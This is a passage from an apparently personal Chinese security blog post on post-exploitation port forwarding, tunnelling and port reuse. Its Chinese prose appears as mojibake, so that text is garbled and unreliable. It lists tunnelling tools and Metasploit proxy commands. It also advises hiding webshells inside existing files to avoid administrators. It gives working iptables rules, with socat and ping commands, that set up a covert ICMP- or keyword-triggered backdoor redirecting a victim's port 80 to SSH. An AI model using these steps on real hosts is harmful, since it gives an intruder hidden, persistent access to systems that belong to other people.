<a href="https://www.mcafee.com/au/downloads/free-tools/fpipe.aspx"target="_blank" rel="noopener noreferrer">fpipe</a> - è€ƒå¤å‘ï¼ŒMcAfeeå‡ºå“çš„ç«¯å£æ˜ å°„å·¥å…·ï¼ˆWinä¸‹ï¼‰
<a href="https://sourceforge.net/projects/pjs-passport/"target="_blank" rel="noopener noreferrer">passport</a> - è€ƒå¤å‘ï¼ŒXPä¸Šçš„ç«¯å£è½¬å‘å·¥å…·ï¼Œæ”¯æŒUDP
<a href="https://github.com/zcnhonker/HTran"target="_blank" rel="noopener noreferrer">HTran</a> - è€ƒå¤å‘ï¼Œä¹Ÿå°±æ˜¯å¤§å®¶å£ä¸­çš„lcxï¼Œé€Ÿåº¦ä¸€èˆ¬ï¼Œä½†æ˜¯ç¨³å®š</p>
<h2 id="åº”ç”¨å±‚éš§é“">åº”ç”¨å±‚éš§é“</h2>
<h3 id="socks">Socks</h3>
<p>æ¡ä»¶å…è®¸çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ç›´æ¥åœ¨æœåŠ¡å™¨å¼€å¯SocksæœåŠ¡ï¼Œç„¶åé…åˆå®¢æˆ·ç«¯ä½¿ç”¨ã€‚å› ä¸ºç®€å•åŠ ä¸Šç½‘ä¸Šæ•°é‡ä¼—å¤šï¼ŒåŠ ä¸Šå¾ˆå¤šå·¥å…·é™„å¸¦ï¼Œè¿™é‡Œä¸»è¦ä½¿ç”¨Socks5(RFC1928)ï¼Œéšä¾¿åˆ—ä¸¾ä¸€äº›å·¥å…·ã€‚</p>
<p><a href="https://github.com/armon/go-socks5"target="_blank" rel="noopener noreferrer">Go Socks5</a>
<a href="https://github.com/ThrDev/Socks5"target="_blank" rel="noopener noreferrer">C# Socks5</a>
<a href="https://github.com/isayme/socks5"target="_blank" rel="noopener noreferrer">C++ Socks5</a>
<a href="https://github.com/Drewsif/PySecretSOCKS"target="_blank" rel="noopener noreferrer">py Socks4/5</a>
<a href="https://github.com/p3nt4/Invoke-SocksProxy"target="_blank" rel="noopener noreferrer">PS Socks4/5</a> - æ”¯æŒç«¯å£æ˜ å°„</p>
<h3 id="apt">APT</h3>
<p>åœ¨MSFä¸‹å¯ä»¥ä½¿ç”¨ç«¯å£è½¬å‘å’Œä»£ç†åŠŸèƒ½</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">portfwd add -l <span class="m">2222</span> -r target -p <span class="m">3389</span>
</span></span></code></pre></div><p>è®¾å®šè·¯ç”±</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">route add 192.168.0.0 255.255.0.0 <span class="m">1</span>
</span></span></code></pre></div><p>å¯ç”¨socks4aä»£ç†</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use auxiliary/server/socks4a
</span></span><span class="line"><span class="cl"><span class="nb">set</span> SRVPORT <span class="m">2080</span>
</span></span><span class="line"><span class="cl">exploit -y
</span></span></code></pre></div><p>CobaltStrikeå¯ä»¥åœ¨ç›®æ ‡ä¸Šå¼€å¯Socks4Aï¼Œè½¬å‘åˆ°Teamserverï¼Œç„¶åTeamserverç›‘å¬ç«¯å£ï¼Œç­‰å¾…æ”»å‡»è€…è¿æ¥ã€‚</p>
<h3 id="dns-tunnel">DNS tunnel</h3>
<p><a href="https://github.com/yarrick/iodine"target="_blank" rel="noopener noreferrer">iodine</a> - éå¸¸å¥½ç”¨çš„DNSéš§é“
<a href="https://pkgs.org/download/dns2tcp"target="_blank" rel="noopener noreferrer">Dns2tcp</a> - Kalié¢„è£…çš„DNSéš§é“
<a href="https://github.com/iagox86/dnscat2"target="_blank" rel="noopener noreferrer">dnscat2</a> - ç”¨Rubyå†™çš„DNSéš§é“ï¼Œè¿˜æ²¡ç”¨è¿‡</p>
<h3 id="webshell-tunnel">WebShell tunnel</h3>
<p><a href="https://github.com/gorgiaxx/reGeorg"target="_blank" rel="noopener noreferrer">reGeorg</a> - reGeorgä¿®æ”¹ç‰ˆï¼Œæ”¯æŒè‡ªå®šä¹‰å¤´ï¼Œä¼˜åŒ–äº†è¿æ¥æ¬¡æ•°ï¼Œæ›´åŠ å¿«å’Œç¨³å®š
<a href="https://github.com/SECFORCE/Tunna"target="_blank" rel="noopener noreferrer">Tunna</a> - å¦ä¸€æ¬¾æ­£å‘ä»£ç†ï¼Œæ–°å¢äº†è‡ªå®šä¹‰Cookieï¼ŒåŸºç¡€è®¤è¯ï¼Œç¨³å®šæ€§ä¸€èˆ¬
<a href="https://github.com/nccgroup/ABPTTS"target="_blank" rel="noopener noreferrer">ABPTTS</a> - æ®è¯´æ˜¯èåˆäº†reGeorgå’ŒTunnaçš„ä¼˜ç‚¹ï¼Œæ›´åŠ ç¨³å®šï¼Œå…¼å®¹æ€§æ›´å¥½ï¼Œä½†æ˜¯ä¸æ”¯æŒè‡ªå®šä¹‰HTTPå¤´ï¼Œæ‰¾ä¸ªæ—¶é—´åŠ ä¸Šå»
<a href="https://github.com/sensepost/reDuh.git"target="_blank" rel="noopener noreferrer">reDuh</a> - è€ƒå¤ï¼ŒreGeorgçš„å‰èº«</p>
<h3 id="rmi-deserialized-tunnel">RMI Deserialized tunnel</h3>
<p>TODO, ä¸Šæ¬¡å¬N1ntyå¤§å“¥åˆ†äº«çš„JSPspy on RMIï¼Œæœ‰äº†è¿™ä¸ªçµæ„Ÿï¼Œæ‰¾ä¸ªæ—¶é—´å¡«ä¸Šå»ã€‚</p>
<h2 id="å¤ç”¨æŠ€å·§">å¤ç”¨æŠ€å·§</h2>
<p>æœ‰æ—¶èµ„æºæœ‰é™ï¼Œæ— æ³•å†æ–°å¢èµ„æºï¼Œè¿™æ—¶å€™éœ€è¦å¤ç”¨</p>
<h3 id="webshell">Webshell</h3>
<p>å› ä¸ºæœ‰ç”¨åˆ°WebShellçš„Tunnelï¼Œæ‰€ä»¥è¿™é‡Œç¨å¾®æä¸€ä¸‹ã€‚æœ‰æ—¶ï¼Œç›®å½•ä¸‹ç›´æ¥æ–°å¢webshellæ–‡ä»¶ä¼šè¢«ç®¡ç†å‘˜å‘ç°ï¼Œè¿™å°±å¾ˆå°´å°¬ï¼Œç›´æ¥åœ¨æ–‡ä»¶ä¸­æ’å…¥åé—¨ï¼ŒåŒ…å«ä¸€ä¸ªèµ„æºåç¼€åçš„webshellã€‚æˆ–è€…ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå…è®¸è§£æèµ„æºç±»å‹æ–‡ä»¶ã€‚ä¹Ÿå¯ä»¥åŠ è½½è¿›å†…å­˜ä¸­ï¼Œä¸è¿‡é‡å¯æœåŠ¡å°±ä¼šå¤±æ•ˆã€‚</p>
<p>åœ¨Nginxä¸­ï¼Œå¯¹äºHTTPæœåŠ¡ï¼Œå¯ä»¥é€šè¿‡è·¯ç”±ç­–ç•¥å¤ç”¨ç«¯å£ï¼Œè§£æèµ„æºæ–‡ä»¶ç±»å‹çš„Webshellã€‚</p>
<p>TODO, æ˜¯å¦å¯ä»¥å®ç°nginxçš„streamå’ŒhttpæœåŠ¡å…±ç”¨ç«¯å£ï¼Œå¯èƒ½è¦ç”¨åˆ°luaã€‚</p>
<h3 id="iptablesè§„åˆ™">iptablesè§„åˆ™</h3>
<p>è¿™é‡Œå€Ÿç”¨<a href="https://threathunter.org/topic/594545184ea5b2f5516e2033"target="_blank" rel="noopener noreferrer">N1ntyçš„åˆ†äº«</a>ï¼Œè¿™é‡Œä½œè€…ä»‹ç»å½“æ¥æ”¶åˆ°æŒ‡å®šç‰¹å¾çš„æ•°æ®åŒ…ï¼Œå°±å¯ç”¨å¯¹åº”è§„åˆ™ï¼Œé¦–å…ˆåˆ›å»ºè½¬å‘è§„åˆ™ï¼Œç„¶åå†åˆ›å»ºè§¦å‘æœºåˆ¶ã€‚è¿™ç¯‡æ–‡ç« åœ¨å…¶ä»–å®‰å…¨åª’ä½“ä¹Ÿæœ‰æŠ•ç¨¿ï¼Œè¯„è®ºé‡Œæœ‰è‡ªä½œèªæ˜çš„äººæåˆ°æ ¹æ®IPè½¬å‘ï¼Œè¯´è¿™ç§è¯çš„æ˜¯æ²¡ä»”ç»†çœ‹æ–‡ç« çš„ã€‚</p>
<h4 id="æ ¹æ®æºç«¯å£åˆ†æµ">æ ¹æ®æºç«¯å£åˆ†æµ</h4>
<p>å°†å‘é€æœ¬æœº 80 ç«¯å£ï¼Œæºç«¯å£ä¸º 8989 çš„æµé‡é‡å®šå‘è‡³æœ¬æœº 22 ç«¯å£</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/sbin/iptables -t nat -A PREROUTING -p tcp --sport <span class="m">8989</span> --dport <span class="m">80</span> -j REDIRECT --to-port <span class="m">22</span>
</span></span></code></pre></div><p>æœ¬åœ°ç›‘å¬ 9000 ç«¯å£ï¼Œä½¿ç”¨æºç«¯å£ 8989 è®¿é—®å—å®³æœºçš„ 80 ç«¯å£</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">socat tcp-listen:9000,fork,reuseaddr tcp:victim_B:80,sourceport<span class="o">=</span>8989,reuseaddr <span class="p">&amp;</span>
</span></span><span class="line"><span class="cl">ssh attacker_A@127.0.0.1 -p <span class="m">9000</span>
</span></span></code></pre></div><h4 id="æ ¹æ®icmpé•¿åº¦åˆ†æµ">æ ¹æ®ICMPé•¿åº¦åˆ†æµ</h4>
<blockquote>
<p>åˆ©ç”¨ ICMP åšé¥æ§å¼€å…³ã€‚ç¼ºç‚¹åœ¨äºå¦‚æœç›®æ ‡åœ¨å†…ç½‘ï¼Œä½ æ˜¯æ— æ³•ç›´æ¥ ping åˆ°å®ƒçš„ã€‚</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># åˆ›å»ºç«¯å£å¤ç”¨é“¾</span>
</span></span><span class="line"><span class="cl">iptables -t nat -N LETMEIN
</span></span><span class="line"><span class="cl"><span class="c1"># åˆ›å»ºç«¯å£å¤ç”¨è§„åˆ™ï¼Œå°†æµé‡è½¬å‘è‡³ 22 ç«¯å£</span>
</span></span><span class="line"><span class="cl">iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port <span class="m">22</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å¼€å¯å¼€å…³ï¼Œå¦‚æœæ¥æ”¶åˆ°ä¸€ä¸ªé•¿ä¸º 1139 çš„ ICMP åŒ…ï¼Œåˆ™å°†æ¥æº IP æ·»åŠ åˆ°åŠ ä¸º letmein çš„åˆ—è¡¨ä¸­</span>
</span></span><span class="line"><span class="cl">iptables -t nat -A PREROUTING -p icmp --icmp-type <span class="m">8</span> -m length --length <span class="m">1139</span> -m recent --set --name letmein --rsource -j ACCEPT
</span></span><span class="line"><span class="cl"><span class="c1"># å…³é—­å¼€å…³ï¼Œå¦‚æœæ¥æ”¶åˆ°ä¸€ä¸ªé•¿ä¸º 1140 çš„ ICMP åŒ…ï¼Œåˆ™å°†æ¥æº IP ä» letmein åˆ—è¡¨ä¸­å»æ‰</span>
</span></span><span class="line"><span class="cl">iptables -t nat -A PREROUTING -p icmp --icmp-type <span class="m">8</span> -m length --length <span class="m">1140</span> -m recent --name letmein --remove -j ACCEPT
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># let&#39;s do itï¼Œå¦‚æœå‘ç° SYN åŒ…çš„æ¥æº IP å¤„äº letmein åˆ—è¡¨ä¸­ï¼Œå°†è·³è½¬åˆ° LETMEIN é“¾è¿›è¡Œå¤„ç†ï¼Œæœ‰æ•ˆæ—¶é—´ä¸º 3600 ç§’</span>
</span></span><span class="line"><span class="cl">iptables -t nat -A PREROUTING -p tcp --dport <span class="m">80</span> --syn -m recent --rcheck --seconds <span class="m">3600</span> --name letmein --rsource -j LETMEIN
</span></span></code></pre></div><p>IPåŒ…å¤´20å­—èŠ‚ï¼ŒICMPåŒ…å¤´8å­—èŠ‚ï¼ŒiptablesåŒ…é•¿åº¦=ICMPåŒ…å†…å®¹é•¿åº¦+28å­—èŠ‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## enable LETMEIN</span>
</span></span><span class="line"><span class="cl">ping -c <span class="m">1</span> -s <span class="m">1111</span> victim_B
</span></span><span class="line"><span class="cl"><span class="c1">## disable LETMEIN</span>
</span></span><span class="line"><span class="cl">ping -c <span class="m">1</span> -s <span class="m">1112</span> victim_B
</span></span></code></pre></div><h4 id="æ ¹æ®tcpä¸­å…³é”®å­—åˆ†æµ">æ ¹æ®TCPä¸­å…³é”®å­—åˆ†æµ</h4>
<blockquote>
<p>åˆ©ç”¨ tcp æ•°æ®åŒ…ä¸­çš„å…³é”®å­—åšé¥æ§å¼€å…³ï¼Œä¸æ€•ç›®æ ‡åœ¨å†…ç½‘ã€‚</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># ç«¯å£å¤ç”¨é“¾</span>
</span></span><span class="line"><span class="cl">iptables -t nat -N LETMEIN
</span></span><span class="line"><span class="cl"><span class="c1"># ç«¯å£å¤ç”¨è§„åˆ™</span>
</span></span><span class="line"><span class="cl">iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port <span class="m">22</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å¼€å¯å¼€å…³</span>
</span></span><span class="line"><span class="cl">iptables -A INPUT -p tcp -m string --string <span class="s1">&#39;threathuntercoming&#39;</span> --algo bm -m recent --set --name letmein --rsource -j ACCEPT
</span></span><span class="line"><span class="cl"><span class="c1"># å…³é—­å¼€å…³</span>
</span></span><span class="line"><span class="cl">iptables -A INPUT -p tcp -m string --string <span class="s1">&#39;threathunterleaving&#39;</span> --algo bm -m recent --name letmein --remove -j ACCEPT
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># let&#39;s do it</span>
</span></span><span class="line"><span class="cl">iptables -t nat -A PREROUTING -p tcp --dport <span class="m">80</span> --syn -m recent --rcheck --seconds <span class="m">3600</span> --name letmein --rsource -j LETMEIN
</span></span></code></pre></div><p>è¿™æ ·æœ‰ä¸€ä¸ªç¼ºç‚¹ï¼Œå°±æ˜¯åŠ å…¥letmeinçš„ipåˆ—è¡¨æ˜¯ä¸Šçº§ä»£ç†çš„IPï¼Œæ‰€ä»¥å¼€å¯è¿™é¡¹è§„åˆ™ä¼šå½±å“æ­£å¸¸ç”¨æˆ·çš„ä½¿ç”¨ã€‚</p>
<p>ä½†æ˜¯è§‰å¾—è¿™æ ·å·²ç»åšçš„å¾ˆå¥½äº†ï¼Œå› ä¸ºç»è¿‡IPå±‚ä¼šå˜åŒ–ï¼Œæ²¡æœ‰ç©ºä½™çš„å­—æ®µä½œä¸ºæ ‡è®°ã€‚TCPå±‚é™¤äº†Urgent Pointerè¿™ä¸ªå­—æ®µå…¶ä»–éƒ½æœ‰ç”¨ï¼Œæ‰€ä»¥åªèƒ½åœ¨å†…å®¹é‡Œåšè¯†åˆ«ï¼Œä½†æ˜¯è¿™æ ·iptableså°±æ²¡æœ‰ç”¨äº†ï¼Œä¹Ÿåç¦»äº†æœ€åˆçš„ç›®çš„ï¼Œå°±ç®—åœ¨éå¸¸æç«¯çš„ç¯å¢ƒï¼Œå®æ„¿å»å¤ç”¨åº”ç”¨å±‚çš„æœåŠ¡ï¼Œä¹Ÿä¸æ„¿æ„å»æŠ˜è…¾è¿™ä¸ªã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## enable LETMEIN</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> threathuntercoming <span class="p">|</span> socat - tcp:victim_B:80
</span></span><span class="line"><span class="cl"><span class="c1">## disable LETMEIN</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> threathunterleaving <span class="p">|</span> socat - tcp:victim_B:80
</span></span></code></pre></div><h2 id="ä½¿ç”¨ipv6">ä½¿ç”¨IPv6</h2>
<p>å¦‚æœè®¾å¤‡æ”¯æŒIPv6ï¼Œä¹Ÿè®¸ç«¯å£ä¸è¢«é™åˆ¶ï¼Œå¯ä»¥å°è¯•ã€‚</p>
<p>Linuxä¸‹ä½¿ç”¨IPv6åœ°å€ï¼Œè¦åŠ %å·æŒ‡å®šæ¥å£å</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh root@fe80::2e0:4cff:fe68:eae%eth0
</span></span><span class="line"><span class="cl">ping6 fe80::aefa:5908:5d93:44ba%eth0
</span></span></code></pre></div><p>Windowsä¸‹ç›´æ¥ä½¿ç”¨</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">ping -6 fe80::aefa:5908:5d93:44ba
</span></span></code></pre></div><h2 id="æ€»ç»“">æ€»ç»“</h2>
<p>è¿™åªæ˜¯æ¸—é€ä¸­çš„ä¸€ä¸ªå°ç¯èŠ‚ï¼Œå®æˆ˜æ—¶éœ€è¦å¯¹æŠ—å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼Œè¿™æ–¹é¢è¿˜æ˜¯æŠ€æœ¯ç›²ç‚¹ã€‚</p>
<h2 id="reference">Reference</h2>
<p><a href="https://threathunter.org/topic/594545184ea5b2f5516e2033"target="_blank" rel="noopener noreferrer">è¿œç¨‹é¥æ§ IPTables è¿›è¡Œç«¯å£å¤ç”¨</a></p>
<p><a href="https://linux.die.net/man/8/iptables"target="_blank" rel="noopener noreferrer">iptables - Linux man page</a></p>
</article><section class="article labels"><a class="category" href=/zh/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/>ç½‘ç»œå®‰å…¨</a><a class="tag" href=/zh/tags/%E8%BD%AC%E5%8F%91/>è½¬å‘</a><a class="tag" href=/zh/tags/%E9%9A%A7%E9%81%93/>éš§é“</a><a class="tag" href=/zh/tags/%E6%98%A0%E5%B0%84/>æ˜ å°„</a><a class="tag" href=/zh/tags/%E5%90%8E%E6%B8%97%E9%80%8F/>åæ¸—é€</a><a class="tag" href=/zh/tags/%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/>æ­£å‘ä»£ç†</a><a class="tag" href=/zh/tags/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/>åå‘ä»£ç†</a></section>
</div>

<div class="toc-wrapper">
    <div class="toc-content-box" id="toc-content-box">
        <div class="toc-header">ç›®å½•</div>
        <nav id="TableOfContents">
  <ol>
    <li><a href="#æ€è·¯">æ€è·¯</a></li>
    <li><a href="#ç›´æ¥è½¬å‘">ç›´æ¥è½¬å‘</a>
      <ol>
        <li><a href="#ssh">SSH</a>
          <ol>
            <li><a href="#è½¬å‘è¿œç¨‹ç«¯å£åˆ°æœ¬åœ°ç«¯å£">è½¬å‘è¿œç¨‹ç«¯å£åˆ°æœ¬åœ°ç«¯å£</a></li>
            <li><a href="#è½¬å‘æœ¬åœ°ç«¯å£åˆ°è¿œç¨‹ç«¯å£">è½¬å‘æœ¬åœ°ç«¯å£åˆ°è¿œç¨‹ç«¯å£</a></li>
            <li><a href="#ä½¿ç”¨socks5ä»£ç†">ä½¿ç”¨Socks5ä»£ç†</a></li>
          </ol>
        </li>
        <li><a href="#iptablesç«¯å£æ˜ å°„">iptablesç«¯å£æ˜ å°„</a></li>
        <li><a href="#netshç«¯å£æ˜ å°„">netshç«¯å£æ˜ å°„</a></li>
        <li><a href="#netcat">netcat</a>
          <ol>
            <li><a href="#ç«¯å£æ˜ å°„">ç«¯å£æ˜ å°„</a></li>
            <li><a href="#ç«¯å£è½¬å‘">ç«¯å£è½¬å‘</a></li>
          </ol>
        </li>
        <li><a href="#socat">socat</a>
          <ol>
            <li><a href="#æ˜ å°„æ“ä½œ">æ˜ å°„æ“ä½œ</a></li>
            <li><a href="#è½¬å‘æ“ä½œ">è½¬å‘æ“ä½œ</a></li>
          </ol>
        </li>
        <li><a href="#udpéš§é“">UDPéš§é“</a>
          <ol>
            <li><a href="#rtcp2udp">rtcp2udp</a></li>
            <li><a href="#udptunnel">udptunnel</a></li>
          </ol>
        </li>
        <li><a href="#icmpéš§é“">ICMPéš§é“</a>
          <ol>
            <li><a href="#icmptunnel">icmptunnel</a></li>
            <li><a href="#ptunnel">ptunnel</a></li>
          </ol>
        </li>
        <li><a href="#sctpéš§é“">SCTPéš§é“</a>
          <ol>
            <li><a href="#dccpéš§é“">DCCPéš§é“</a></li>
          </ol>
        </li>
        <li><a href="#nginxè½¬å‘">Nginxè½¬å‘</a></li>
        <li><a href="#å…¶ä»–å·¥å…·">å…¶ä»–å·¥å…·</a></li>
      </ol>
    </li>
    <li><a href="#åº”ç”¨å±‚éš§é“">åº”ç”¨å±‚éš§é“</a>
      <ol>
        <li><a href="#socks">Socks</a></li>
        <li><a href="#apt">APT</a></li>
        <li><a href="#dns-tunnel">DNS tunnel</a></li>
        <li><a href="#webshell-tunnel">WebShell tunnel</a></li>
        <li><a href="#rmi-deserialized-tunnel">RMI Deserialized tunnel</a></li>
      </ol>
    </li>
    <li><a href="#å¤ç”¨æŠ€å·§">å¤ç”¨æŠ€å·§</a>
      <ol>
        <li><a href="#webshell">Webshell</a></li>
        <li><a href="#iptablesè§„åˆ™">iptablesè§„åˆ™</a>
          <ol>
            <li><a href="#æ ¹æ®æºç«¯å£åˆ†æµ">æ ¹æ®æºç«¯å£åˆ†æµ</a></li>
            <li><a href="#æ ¹æ®icmpé•¿åº¦åˆ†æµ">æ ¹æ®ICMPé•¿åº¦åˆ†æµ</a></li>
            <li><a href="#æ ¹æ®tcpä¸­å…³é”®å­—åˆ†æµ">æ ¹æ®TCPä¸­å…³é”®å­—åˆ†æµ</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#ä½¿ç”¨ipv6">ä½¿ç”¨IPv6</a></li>
    <li><a href="#æ€»ç»“">æ€»ç»“</a></li>
    <li><a href="#reference">Reference</a></li>
  </ol>
</nav>
    </div>
    <div class="toc-button" onclick="toggleTOC()" title="">
        
        <svg viewBox="0 0 24 24">
            <path d="M4 6h16v2H4zm0 5h16v2H4zm0 5h16v2H4z"></path>
        </svg>
    </div>
</div>

<script>
    function toggleTOC() {
        const tocBox = document.getElementById('toc-content-box');
        if (tocBox.classList.contains('show')) {
            tocBox.classList.remove('show');
            
            
            
            
            
            setTimeout(() => {
                tocBox.style.display = 'none';
            }, 300); 
        } else {
            tocBox.style.display = 'block';
            
            void tocBox.offsetWidth;
            tocBox.classList.add('show');
        }
    }

    
    document.addEventListener('click', function (event) {
        const wrapper = document.querySelector('.toc-wrapper');
        const tocBox = document.getElementById('toc-content-box');
        if (wrapper && !wrapper.contains(event.target) && tocBox.classList.contains('show')) {
            toggleTOC();
        }
    });
</script><div class="article bottom"><section class="article navigation"><p><a class="link" href="/zh/posts/remove-bcy-image-watermark-and-download-limit/"><span class="iconfont icon-article"></span>å»é™¤åŠæ¬¡å…ƒå›¾ç‰‡æ°´å°å’Œä¸‹è½½é™åˆ¶</a></p><p><a class="link" href="/zh/posts/linux-post-exploitation-pam-backdoor-notes/"><span class="iconfont icon-article"></span>Linux åæ¸—é€ç¬”è®° PAMåé—¨</a></p></section></div></section><section id="footer"><div class="footer-wrap">
    <p class="copyright">2015 - 2026 Gorgias' Blog. </p><p class="license">
        <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener noreferrer">
            <img alt="CC BY-NC-SA" loading="lazy" src="/images/by-nc.svg" style="vertical-align: middle; height: 1.2em; margin: 0 0.2em;" />
            CC BY-NC-SA 4.0
        </a>
        (ç½²å-éå•†ä¸šæ€§ä½¿ç”¨-ç›¸åŒæ–¹å¼å…±äº«).
    </p><p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
        target="_blank" rel="noopener noreferrer">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
        target="_blank" rel="noopener noreferrer">Notepadium</a></p></div></section></body>

</html>